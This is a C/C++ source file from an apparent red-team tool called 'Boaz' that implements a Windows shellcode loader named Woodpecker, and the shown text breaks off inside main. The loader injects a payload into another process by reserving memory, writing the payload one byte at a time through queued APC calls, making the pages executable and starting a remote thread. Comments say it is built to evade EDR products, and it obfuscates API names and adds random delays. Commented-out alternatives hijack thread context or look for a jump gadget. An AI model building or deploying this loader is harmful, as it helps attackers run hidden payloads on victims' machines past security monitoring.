/****
# Date 2023
#
# This file is part of the Boaz tool
# Copyright (c) 2019-2024 Thomas M
# Licensed under the GPLv3 or later.
 * # update support argument -bin position_independent_code.bin as input instead of hardcoded code. 
*/

/**
Editor: Thomas X Meng
T1055 Process Injection

Woodpecker process injection, stem from ddrriipp loader. 

for magic code > = 64KB , 2 x 64KB is reserved: 
2 x NtAllocateVirtualMemory(PAGE_NOACCESS)  + 2 x 16 x (NtAllocateVirtualMemory(PAGE_READWRITE)) + 64kb x WriteProcessMemoryAPC + 2 x 16 x NtProtectVirtualMemory(PAGE_EXECUTE_READ)

+ 1 x NtCreateThreadEx

Kenshin

**/


// The Woodpecker loader
// derived from the dripp-loader 
// Use custom APC write which significantly increased the amount of noise in between Memory-Alloc and Thread-Execution
// nasm -f win64 woodpecker_assm.asm -o woodpecker_assm.obj
// x86_64-w64-mingw32-g++ -m64 wood.c woodpecker_assm.obj -o wood_pecker.exe -lpsapi -lshlwapi -static -I./evader

#include <stdint.h>

#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <psapi.h>
#include <shlwapi.h>

#include <winternl.h> 

#include <stdlib.h> 
#include <stdio.h>
// #include <ctype.h>

///For dynamic loading: 
// #include "processthreadsapi.h"
// #include "libloaderapi.h"
// #include <winnt.h>
/// PEB module loader:
#include "pebutils.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")

using std::cout;
using std::cin;
using std::vector;

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

EXTERN_C NTSTATUS NtAllocateMemory (
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
);

EXTERN_C NTSTATUS NtWriteMemory (
	HANDLE hProcess,
	PVOID lpBaseAddress,
	PVOID lpBuffer,
	SIZE_T NumberOfBytesToRead,
	PSIZE_T NumberOfBytesRead
);

EXTERN_C NTSTATUS NtProtectMemory (
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	SIZE_T* NumberOfBytesToProtect,
	ULONG NewAccessProtection,
	PULONG OldAccessProtection
);

EXTERN_C NTSTATUS NtCreateThd (
	HANDLE* pHandle, 
	ACCESS_MASK DesiredAccess, 
	PVOID pAttr, 
	HANDLE hProc, 
	PVOID StartRoutine,
	PVOID Argument,
	ULONG Flags, 
	SIZE_T ZeroBits, 
	SIZE_T StackSize, 
	SIZE_T MaxStackSize, 
	PVOID pAttrListOut
);


///////////////////////////// magic code  ///////////

unsigned char magiccode[] = ####SHELLCODE####;

// -bin: 
unsigned char* magic_code = NULL;
SIZE_T allocatedSize = 0; 


// -bin binary input file
BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize);
/// -----------
/// atsumori life is a dream, a fleeting moment in the grand tapestry of existence.
/// -----------

typedef BOOLEAN (WINAPI *RtlGenRandom_t)(PVOID, ULONG);

RtlGenRandom_t get_RtlGenRandom() {
    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
    if (!hAdvapi) return NULL;
    return (RtlGenRandom_t)GetProcAddress(hAdvapi, "SystemFunction036");
}
 

// #include <bcrypt.h>
// #pragma comment(lib, "bcrypt.lib")

// DWORD get_random_delay() {
//     DWORD val = 0;
//     BCryptGenRandom(NULL, (PUCHAR)&val, sizeof(val), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
//     return 1 + (val % 1000);
// }

void atsumori() {
    DWORD delay = 500; // Fallback default
    RtlGenRandom_t rand_fn = get_RtlGenRandom();

    if (rand_fn) {
        DWORD val = 0;
        if (rand_fn(&val, sizeof(val))) {
            delay = 1 + (val % 2000); // [1, 2000] ms
        }
    }

    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (hEvent) {
        WaitForSingleObjectEx(hEvent, delay, FALSE);
        printf("\033[35m[+] Waited for %lu ms\033[0m\n", delay);
        printf("\033[35m[+] 50 years of a human life: compared with the life in Geten, they are so short as to be but a dream and illusion.\033[0m\n");
        CloseHandle(hEvent);
    }
}


/////////////////////////////


typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}



/////////////////////////////////////// APC Write primitive:

#define ADDR unsigned __int64


///Various methods to GetNtdllBase:
ADDR *GetNtdllBase (void);

#define NT_CREATE_THREAD_EX_SUSPENDED 1
#define NT_CREATE_THREAD_EX_ALL_ACCESS 0x001FFFFF
// Declaration of undocumented functions and structures

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;


/* NtQueueApcThreadEx2 is not hooked by many EDR */
// typedef ULONG (NTAPI *NtQueueApcThread_t)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved);
EXTERN_C NTSTATUS NtQueueApc2 (
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, 
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, 
    PVOID ApcRoutine,
    PVOID SystemArgument1 OPTIONAL,
    PVOID SystemArgument2 OPTIONAL,
    PVOID SystemArgument3 OPTIONAL
);

typedef struct _LDR_DATA_TABLE_ENTRY_FREE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    _ACTIVATION_CONTEXT *EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY_FREE, *PLDR_DATA_TABLE_ENTRY_FREE;

DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength); 

DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength) {
    HANDLE hThread = NULL;

    const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
    // const char NtQueueFutureApcStr[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
    const char NtFillFutureMemoryStr[] = { 'R', 't', 'l', 'F', 'i', 'l', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    const char NtMoveFutureMemoryStr[] = { 'R', 't', 'l', 'M', 'o', 'v', 'e', 'M', 'e', 'm', 'o', 'r', 'y', 0 };

    HANDLE ntdll = GetModuleHandle(getLib);

    BYTE *pModuleBase = NULL;
    pModuleBase = (BYTE*)GetNtdllBase();
    void *pRtlFillMem = (void*)(uintptr_t)GetProcAddress((HMODULE)pModuleBase, NtFillFutureMemoryStr);
    void *pRtlMoveMem = (void*)(uintptr_t)GetProcAddress((HMODULE)pModuleBase, NtMoveFutureMemoryStr);

    // print the address of pRtlFillMem
    if (!pRtlFillMem || !pRtlMoveMem) {
        printf("\033[31m[-] Failed to locate RtlFillMemory.\033[0m\n");
    } else {
        printf("\033[32m[+] RtlFillMemory located at %p\033[0m\n", pRtlFillMem);
    }

    
    
    // open existing thread: 
    // hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, GetCurrentThreadId()); 
    // SuspendThread(hThread);

    // Create a thread with start routine set to ExitThread and suspended. 
    NTSTATUS status = NtCreateThd(
        &hThread,
        NT_CREATE_THREAD_EX_ALL_ACCESS,
        NULL,
        hProcess,
        (PVOID)(ULONG_PTR)ExitThread,
        NULL,
        NT_CREATE_THREAD_EX_SUSPENDED,
        0,
        0,
        0,
        NULL);

    if (status != 0) {
        printf("\033[31m[-] Failed to create remote thread: %lu\033[0m\n", status);
        return 1;
    }
    printf("\033[32m[+] NtCreateThreadEx succeeded\033[0m\n");

    // get thread pid: 
    DWORD threadId = GetThreadId(hThread);
    printf("\033[32m[+] Created thread with ID: %lu\033[0m\n", threadId);


    QUEUE_USER_APC_FLAGS apcFlags = QUEUE_USER_APC_FLAGS_NONE;
    NTSTATUS result = 0;


    // create a cpunter for number of NtQueueApc2 run: 
    DWORD apcCounter = 0;

    for (DWORD i = 0; i < dwLength; i++) {
        BYTE byte = pData[i];

        // Print only for the first and last byte
        if (i == 0 || i == dwLength - 1) {
            if(i == 0) {
                printf("\033[32m[+] Queue Apc Ex2 Writing start byte 0x%02X to address %p\033[0m\n", byte, (void*)((BYTE*)pAddress + i));
            } else {
                printf("\033[32m[+] Queue Apc Ex2 Writing end byte 0x%02X to address %p\033[0m\n", byte, (void*)((BYTE*)pAddress + i));
            }
        }
        // no Ex:
        // ULONG result  = NtQueueApc2(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
        // if (result != STATUS_SUCCESS) {
        //     printf("[-] Failed to queue APC. NTSTATUS: 0x%X\n", result);
        //     TerminateThread(hThread, 0);
        //     CloseHandle(hThread);
        //     return 1;
        // }
        // Ex:

        //pRtlFillMemory can be replaced with memset or memmove
        result = NtQueueApc2(
        hThread,  
        NULL,  
        apcFlags,  
        pRtlFillMem,  
        (PVOID)(pAddress + i), // SystemArgument1: Memory address to fill, offset by i 
        (PVOID)1, // SystemArgument2: The size argument for RtlFillMemory 
        (PVOID)(ULONG_PTR)byte // SystemArgument3: The byte value to fill, cast properly 
        );
        if (result != STATUS_SUCCESS) {
            printf("\033[31m[-] Failed to queue APC Ex2. NTSTATUS: 0x%X\033[0m\n", result);
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            return 1;
        } else {
            // printf("[+] APC Ex2 queued successfully\n");
            apcCounter++;
        }

    }


    // result = NtQueueApc2(
    // hThread,  
    // NULL,  
    // apcFlags,  
    // GetProcAddress((HMODULE)pModuleBase, "memmove"),  
    // (PVOID)pAddress,  
    // (PVOID)pData,  
    // (PVOID)dwLength 
    // );
    // if (result != STATUS_SUCCESS) {
    //     printf("\033[31m[-] Failed to queue APC Ex2. NTSTATUS: 0x%X\033[0m\n", result);
    //     TerminateThread(hThread, 0);
    //     CloseHandle(hThread);
    //     return 1;
    // } else {
    //     printf("[+] APC Ex2 queued memmove successfully\n");
    // }


    printf("\033[32m[+] Successfully queued APC %lu times\033[0m\n", apcCounter);
    DWORD count = ResumeThread(hThread);
    printf("\033[32m[+] Resuming thread %lu to write bytes\033[0m\n", threadId);

    WaitForSingleObject(hThread, INFINITE);
    // printf("\033[32m[+] press any key to continue\033[0m\n");
    // getchar();

    return result; 


}

// /** */
// Find rop gadget for execution: 
//


void *find_jmp_rcx_gadget(const char *dllName, SIZE_T maxScan) {
    if (!maxScan) maxScan = 100000;
    HMODULE hModule = LoadLibraryA(dllName);
    if (!hModule) {
        printf("\033[31m[-] Failed to load DLL: %s\033[0m\n", dllName);
        return NULL;
    }
    char *base = (char *)hModule;

    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T queryAddr = (SIZE_T)base;
    void *retGadget = NULL;
    SIZE_T scanned = 0;

    HANDLE processHandle = GetCurrentProcess();
    BYTE buffer[4096];
    SIZE_T i, j;

    while (VirtualQueryEx(processHandle, (LPCVOID)queryAddr, &mbi, sizeof(mbi)) == sizeof(mbi) && scanned < maxScan) {
        if ((mbi.Type == MEM_IMAGE) &&
            (mbi.Protect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY | PAGE_EXECUTE | PAGE_EXECUTE_WRITECOPY)) &&
            (mbi.State == MEM_COMMIT)) {

            SIZE_T regionBase = (SIZE_T)mbi.BaseAddress;
            SIZE_T regionEnd = regionBase + mbi.RegionSize;
            SIZE_T scanStart = regionBase > queryAddr ? regionBase : queryAddr;
            SIZE_T scanEnd = regionEnd > (SIZE_T)base + maxScan ? (SIZE_T)base + maxScan : regionEnd;

            for (i = scanStart; i < scanEnd && !retGadget; i += sizeof(buffer)) {
                SIZE_T toRead = (scanEnd - i) < sizeof(buffer) ? (scanEnd - i) : sizeof(buffer);
                SIZE_T bytesRead = 0;

                printf("[*] Hunting for gadget at address %p\n", (char *)i);

                if (!ReadProcessMemory(processHandle, (LPCVOID)i, buffer, toRead, &bytesRead) || bytesRead == 0)
                    continue;

                for (j = 0; j + 1 < bytesRead && !retGadget; j++) {
                    if (buffer[j] == 0xFF && buffer[j + 1] == 0xE1) {
                        retGadget = (void *)(i + j);
                        printf("\033[32m[+] JMP RCX gadget found at %p\033[0m\n", retGadget);
                        break;
                    }
                }
            }
            scanned += (scanEnd - scanStart);
        }
        queryAddr = (SIZE_T)mbi.BaseAddress + mbi.RegionSize;
    }

    if (!retGadget) {
        printf("\033[31m[-] No JMP RCX gadget found in %s IMAGE executable region\033[0m\n", dllName);
    }
    return retGadget;
}


//  
/*** Free memory region start address candidates ***/
//  
const std::vector<LPVOID> Allocated_mem_base_addr{ (void*)0x00000000DDDD0000,
                                       (void*)0x0000000010000000,
                                       (void*)0x0000000021000000,
                                       (void*)0x0000000032000000,
                                       (void*)0x0000000043000000,
                                       (void*)0x0000000050000000,
                                       (void*)0x0000000041000000,
                                       (void*)0x0000000042000000,
                                       (void*)0x0000000040000000,
                                       (void*)0x0000000022000000 };




char jmpModName[]{ 'n','t','d','l','l','.','d','l','l','\0' };
// RtlRemoteCall3
char RtlRemoteCall3FuncName[]{ 'R','t','l','R','e','m','o','t','e','C','a','l','l','\0' };


// LPVOID pRetext(HANDLE hProc, LPVOID vm_base) {
//     unsigned char* b = (unsigned char*)&vm_base;
//     unsigned char jmpSc[7]{ 0xB8, b[0], b[1], b[2], b[3], 0xFF, 0xE0 };

//     HMODULE hJmpMod = LoadLibraryExA(jmpModName, NULL, DONT_RESOLVE_DLL_REFERENCES);
//     if (!hJmpMod) return nullptr;

//     LPVOID lpDllExport = (LPVOID)GetProcAddress(hJmpMod, RtlRemoteCall3FuncName);
//     if (!lpDllExport) {
//         printf("\033[31m[-] Failed to find export %s in module %s\033[0m\n", RtlRemoteCall3FuncName, jmpModName);
//         return nullptr;
//     } else {
//         printf("\033[32m[+] Found export %s in module %s at address %p\033[0m\n", RtlRemoteCall3FuncName, jmpModName, lpDllExport);
//     }

//     DWORD offsetJmpFunc = (DWORD)(DWORD_PTR)lpDllExport - (DWORD)(DWORD_PTR)hJmpMod;

//     HMODULE hMods[1024];
//     DWORD cbNeeded;
//     char szModName[MAX_PATH];
//     LPVOID lpRemFuncEP = nullptr;

//     if (EnumProcessModules(hProc, hMods, sizeof(hMods), &cbNeeded)) {
//         for (unsigned int i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
//             if (GetModuleFileNameExA(hProc, hMods[i], szModName, sizeof(szModName) / sizeof(char))) {
//                 if (strcmp(PathFindFileNameA(szModName), jmpModName) == 0) {
//                     lpRemFuncEP = hMods[i];
//                     break;
//                 }
//             }
//         }
//     }

//     lpRemFuncEP = (LPVOID)((DWORD_PTR)lpRemFuncEP + offsetJmpFunc);
//     if (!lpRemFuncEP) return nullptr;

//     SIZE_T szWritten{ 0 };
//     WriteProcessMemory(hProc, lpDllExport, jmpSc, sizeof(jmpSc), &szWritten);
//     return lpDllExport;
// }



// 
// Helpers
// 
void AnsiEnable() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);
}



LPVOID FindSuitableBaseAddress(HANDLE hProc, DWORD szPage, DWORD szAllocGran, DWORD cVmResv) {
    MEMORY_BASIC_INFORMATION mbi;
    for (auto base : Allocated_mem_base_addr) {
        VirtualQueryEx(hProc, base, &mbi, sizeof(mbi));
        if (mbi.State != MEM_FREE) continue;

        uint64_t i;
        for (i = 0; i < cVmResv; ++i) {
            LPVOID currentBase = (void*)((DWORD_PTR)base + (i * szAllocGran));
            VirtualQueryEx(hProc, currentBase, &mbi, sizeof(mbi));
            if (mbi.State != MEM_FREE) break;
        }
        if (i == cVmResv) return base;
    }
    return nullptr;
}

int woodPecker(int tpid, HANDLE hProc, const unsigned char* magiccode, DWORD szPage, DWORD szAllocGran);
int woodPecker(int tpid, HANDLE hProc, const unsigned char* magiccode, DWORD szPage, DWORD szAllocGran) {


    SIZE_T szVmResv = szAllocGran; //64KB by default
    SIZE_T szVmCmm = szPage;    // 4KB per page
    DWORD  cVmResv = (allocatedSize / szVmResv) + 1;
    DWORD  cVmCmm = szVmResv / szVmCmm;

    LPVOID vmBaseAddress = FindSuitableBaseAddress(hProc, szVmCmm, szVmResv, cVmResv);
    if (!vmBaseAddress) return 3; else 
        printf("\033[32m[+] Found suitable base address at 0x%p\033[0m\n", vmBaseAddress);


    // random sleep
    atsumori();

    NTSTATUS status = 0;
    DWORD cmm_i;
    LPVOID currentVmBase = vmBaseAddress;
    vector<LPVOID> vcVmResv;


    // status = NtAllocateMemory(hProc, &currentVmBase, 0, &allocatedSize, MEM_RESERVE, PAGE_NOACCESS);
    for (DWORD i = 1; i <= cVmResv; ++i) {

        // random sleep
        atsumori();
        status = NtAllocateMemory(hProc, &currentVmBase, 0, &szVmResv, MEM_RESERVE, PAGE_NOACCESS);
        
        
        if(status != STATUS_SUCCESS) {
            printf("\033[31m[-] Failed to reserve memory at 0x%p with error %d\033[0m\n", currentVmBase, status);
            return 4;
        } else {
            printf("\033[32m[+] Reserved no-access memory at 0x%p\033[0m\n", currentVmBase);
        }
        if (STATUS_SUCCESS == status) vcVmResv.push_back(currentVmBase);
        else return 4;
        currentVmBase = (LPVOID)((DWORD_PTR)currentVmBase + szVmResv);
    }

    DWORD offsetSc = 0, oldProt;
    double prcDone = 0;
    for (DWORD i = 0; i < cVmResv; ++i) {
        for (cmm_i = 0; cmm_i < cVmCmm; ++cmm_i) {
            prcDone += 1.0 / cVmResv / cVmCmm;
            DWORD offset = (cmm_i * szVmCmm);
            currentVmBase = (LPVOID)((DWORD_PTR)vcVmResv[i] + offset);

            status = NtAllocateMemory(hProc, &currentVmBase, 0, &szVmCmm, MEM_COMMIT, PAGE_READWRITE);
            printf("\n\033[33m[*] change mem to READ WRITE for later use\033[0m\n\n");
            // print debug message: 
            if(status != STATUS_SUCCESS) {
                printf("\033[31m[-] Failed to commit memory at 0x%p with error %d\033[0m\n", currentVmBase, status);
                return 5;
            } else {
                printf("\033[32m[+] Committed memory at 0x%p\033[0m\n", currentVmBase);
            }


            // random sleep
            // atsumori();
            SIZE_T szWritten = 0;


            // for XOR and UUID schemes, etc. we need to write the magiccode in chunks due to they are allocated on stack....
            size_t bytesLeft = allocatedSize - offsetSc;
            size_t bytesToWrite = (bytesLeft < szVmCmm) ? bytesLeft : szVmCmm;
            if (bytesToWrite == 0)
                break; // finished
            printf("[*] offsetSc=%zu, allocatedSize=%zu, bytesToWrite=%zu, currentVmBase=%p\n", offsetSc, allocatedSize, bytesToWrite, currentVmBase);

            
            // conventional write: 
            
            // printF("[*]offsetSc=%zu, allocatedSize=%zu currentVmBase=%p\n", offsetSc, allocatedSize, currentVmBase);
            // status = NtWriteMemory(hProc, currentVmBase, (PVOID)&magiccode[offsetSc], bytesToWrite, &szWritten);

            // APC Write: 
            status = WriteProcessMemoryAPC(hProc, (BYTE*)currentVmBase, (BYTE*)&magiccode[offsetSc], bytesToWrite); 
            offsetSc += bytesToWrite;


            // random sleep


            // conventional write: 
            // printf("[*]offsetSc=%zu, allocatedSize=%zu currentVmBase=%p\n", offsetSc, allocatedSize, currentVmBase);

            // status = NtWriteMemory(hProc, currentVmBase, (PVOID)&magiccode[offsetSc], szVmCmm, &szWritten);
            // random sleep

            if(status != STATUS_SUCCESS) {
                printf("\033[31m[-] Failed to write memory at 0x%p with error %d\033[0m\n", currentVmBase, status);
                return 6;
            } else {
                printf("\033[32m[+] Wrote %zu bytes to memory at 0x%p\033[0m\n", szVmCmm, currentVmBase);
            }

            FlushInstructionCache(hProc, currentVmBase, szVmCmm);


            // random sleep
            // atsumori();
            // offsetSc += szVmCmm;

            status = NtProtectMemory(hProc, &currentVmBase, &szVmCmm, PAGE_EXECUTE_READ, &oldProt);
            if(status != STATUS_SUCCESS) {
                printf("\033[31m[-] Failed to protect memory at 0x%p with error %d\033[0m\n", currentVmBase, status);
                return 7;
            } else {
                printf("\033[32m[+] Protected memory at 0x%p with PAGE_EXECUTE_READ\033[0m\n", currentVmBase);
            }

        }
    }


            // DWORD offsetSc = 0, oldProt;

            // status = NtAllocateMemory(hProc, &currentVmBase, 0, &allocatedSize, MEM_COMMIT, PAGE_READWRITE);
            // printf("\n\033[33m[*] change mem to READ WRITE for later use\033[0m\n\n");
            // // print debug message: 
            // if(status != STATUS_SUCCESS) {
            //     printf("\033[31m[-] Failed to commit memory at 0x%p with error %d\033[0m\n", currentVmBase, status);
            //     return 5;
            // } else {
            //     printf("\033[32m[+] Committed memory at 0x%p\033[0m\n", currentVmBase);
            // }

            // SIZE_T szWritten = 0;

            // status = NtWriteMemory(hProc, currentVmBase, (PVOID)magiccode, allocatedSize, &szWritten);

            // if(status != STATUS_SUCCESS) {
            //     printf("\033[31m[-] Failed to write memory at 0x%p with error %d\033[0m\n", currentVmBase, status);
            //     return 6;
            // } else {
            //     printf("\033[32m[+] Wrote %zu bytes to memory at 0x%p\033[0m\n", szWritten, currentVmBase);
            // }

            // status = NtProtectMemory(hProc, &currentVmBase, &allocatedSize, PAGE_EXECUTE_READ, &oldProt);
            // if(status != STATUS_SUCCESS) {
            //     printf("\033[31m[-] Failed to protect memory at 0x%p with error %d\033[0m\n", currentVmBase, status);
            //     return 7;
            // } else {
            //     printf("\033[32m[+] Protected memory at 0x%p with PAGE_EXECUTE_READ\033[0m\n", currentVmBase);
            // }


    // random sleep
    atsumori();

    // Create A Thread: 
    HANDLE hThread = NULL; 

    // Method 1, original DDRRIIPP loader: 
    // LPVOID entry = pRetext(hProc, vmBaseAddress);
    // if (!entry) {
    //     printf("\033[31m[-] Failed to prepare entry point\033[0m\n");
    //     return 8;
    // } else {
    //     printf("\033[32m[+] Prepared entry point at 0x%p\033[0m\n", entry);
    // }

    // status = NtCreateThd(&hThread, THREAD_ALL_ACCESS, NULL, hProc, (PVOID)entry, NULL, 0, 0, 0, 0, NULL);

    // printf("[+] Press any key to continue \n");
    // getchar();

    // check the bytes & magic number
    // unsigned char buf[16] = {0};
    // ReadProcessMemory(hProc, vmBaseAddress, buf, 16, NULL);
    // for (int i = 0; i < 16; i++) printf("%02X ", buf[i]);


    // exe-2, plain execution: 
    status = NtCreateThd(&hThread, GENERIC_EXECUTE, NULL, hProc, vmBaseAddress, NULL, FALSE, 0, 0, 0, NULL);

    if (status == 0) {
        printf("\033[32m[+] Thread created to execute magiccode\033[0m\n"); 
    } else {
        printf("\033[31m[-] Failed to create thread\033[0m\n"); 
        printf("\033[31m[-] Error code: %d\033[0m\n", status);
    }

    // option 2 for local injection: 

    // _beginthreadex(NULL, 0, vmBaseAddress, NULL, 0, NULL);

    // // print the thread start address and debug messages: 
    // if (status != STATUS_SUCCESS) {
    //     printf("\033[31m[-] Failed to create thread with error %d\033[0m\n", status);
    //     //print the thread start address: 
    //     printf("\033[31m[-] Thread start address: 0x%p\033[0m\n", vmBaseAddress);
    // } else {
    //     printf("\033[32m[+] Created thread at address 0x%p\033[0m\n", vmBaseAddress);
    // }   



    // exe-3, thread context manipulation execution: 

	// void *loadLibrary2 = (void*)GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
	// if (loadLibrary2 == NULL) {
	// 	printf("\033[31m[-] Fault: Could not find address of LoadLibrary\033[0m\n");
	// 	return 1;
	// }

	// hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibrary2, NULL, CREATE_SUSPENDED, NULL);
	// if (hThread == NULL) {
	// 	printf("\033[31m[-] Error: CreateRemoteThread failed [%d] :(\033[0m\n", GetLastError());
	// 	return 2;
	// } else {
    //     printf("\033[32m[+] Created remote thread at loadLibrary addr: %p\033[0m\n", loadLibrary2);
    // }

	// // Get the thread context
	// CONTEXT ctx;
	// ZeroMemory(&ctx, sizeof(CONTEXT));
	// ctx.ContextFlags = CONTEXT_CONTROL;
	// GetThreadContext(hThread, &ctx);

	// printf("\033[34m[+] RIP register point to %p\033[0m\n", (void*)ctx.Rip);

	// printf("\033[34m[+] Change RIP to point to our magiccode\033[0m\n");
	// ctx.Rip = (DWORD64)vmBaseAddress;

    // printf("\033[32m[+] Resuming thread execution at our magiccode.\033[0m\n");
	// SetThreadContext(hThread, &ctx);
	// ResumeThread(hThread);


    // exe-3, jump scare execution: 
    // void *gadget = find_jmp_rcx_gadget("kernel32.dll", 200000);


    // if (!gadget) {
    //     printf("\033[31m[-] Failed to find jump gadget\033[0m\n");
    //     return 9;
    // } else {
    //     printf("\033[32m[+] Found jump gadget at address %p\033[0m\n", gadget);
    // }


    // printf("\033[33m[+] Press any key to continue with remote thread execution...\033[0m\n");
    // getchar();

    // DWORD threadId{ 0 };
    // status = NtCreateThd(&hThread, GENERIC_EXECUTE, NULL, hProc, (char*)gadget, vmBaseAddress, FALSE, 0, 0, 0, NULL);

	// if (hThread == NULL) {
	// 	printf("[-] Error: CreateRemoteThread failed [%d] :(\n", GetLastError());
	// 	return 2;
	// }

    // print thread id: 
    printf("\033[32m[+] Created remote thread with ID %lu\033[0m\n", GetThreadId(hThread));


    // wait for single object: 
    DWORD waitResult = WaitForSingleObject(hThread, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("\033[32m[+] magiccode execution completed\033[0m\n");
    } else {
        printf("\033[31m[-] magiccode execution wait failed\033[0m\n");
    }

    return 0;
}



int main(int argc, char *argv[]) {
    
    AnsiEnable();

    // if (8 != sizeof(void*)) {
    //     cout << "\n\033[31m [-] Error: non-64 bit system\033[0m\n";
    //     return -1;
    // }

    // if(allocatedSize == 0) {
    //     allocatedSize = sizeof(magiccode);
    // }


    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialise the buffer


    // bin
    PCWSTR binPath = nullptr;

    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-bin") == 0) {
            if (i + 1 >= argc || argv[i + 1][0] == '-') {
                fprintf(stderr, "[-] Error: '-bin' flag requires a valid file path argument.\n");
                fprintf(stderr, "    Usage: loader.exe <PID> -bin <path_to_magiccode>\n");
                exit(1);
            }

            size_t wlen = strlen(argv[i + 1]) + 1;
            wchar_t* wpath = new wchar_t[wlen];
            mbstowcs(wpath, argv[i + 1], wlen);
            binPath = wpath;
            break;
        }
    }
    // -bin 

    if (argc > 1 && argv[1] && strlen(argv[1]) > 0 && (pid = atoi(argv[1])) != 0) {
        printf("[+] PID provided: %lu\n", (unsigned long)pid);
        pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        // pi.hThread  = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
    } else {
        system("cls");
        std::string input;
        std::cout << "\nTarget PID: ";
        std::getline(std::cin, input);
        pid = input.empty() ? 0 : atoi(input.c_str());
        if (pid != 0) {
            printf("[+] PID entered: %lu\n", (unsigned long)pid);
            pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            // pi.hThread  = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
        } else {
            printf("[-] PID not provided\n");
            
            if (IsSystem64Bit()) {
                strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
                // strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\RuntimeBroker.exe");
                // or svchost.exe
            } else {
                strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
            }

            BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (!success) {
                MessageBox(NULL, "[-] Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
                return 1;
            }
